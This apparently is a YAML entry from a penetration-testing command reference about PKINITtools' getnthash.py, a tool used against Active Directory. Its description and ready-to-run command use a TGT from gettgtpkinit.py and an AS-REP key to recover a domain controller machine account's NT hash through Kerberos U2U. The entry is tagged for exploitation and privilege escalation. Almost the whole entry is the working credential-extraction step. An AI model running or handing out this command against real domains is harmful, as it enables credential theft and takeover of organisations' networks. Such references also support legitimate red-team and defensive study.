---
description: |
  PKINIT getnthash.py request a TGS for yourself using Kerberos U2U. This will include with the PAC which in turn contains the NT hash that you can decrypt with the AS-REP key that you got from your TGT request using gettgtpkinit.py from PKINIT. Use the TGT from gettgtpkinit.py in your KRB5CCNAME env variable.

  Command Reference:

    Domain: test.local

    Host that you got the TGT from: DC01

    TGT from gettgtpkinit.py: out.ccache

    AS-REP key: 6e63333c372d7fbe64dab63f36673d0cd03bfb92b2a6c96e70070be7cb07f773

command: |
  KRB5CCNAME=out.ccache python3 getnthash.py test.local/DC01\$ -key 6e63333c372d7fbe64dab63f36673d0cd03bfb92b2a6c96e70070be7cb07f773
items:
  - TGT
services:
  - Kerberos
OS:
  - Linux
  - Windows
attack_types:
  - Exploitation
  - PrivEsc
references:
  - https://github.com/dirkjanm/PKINITtools
  - https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/
---
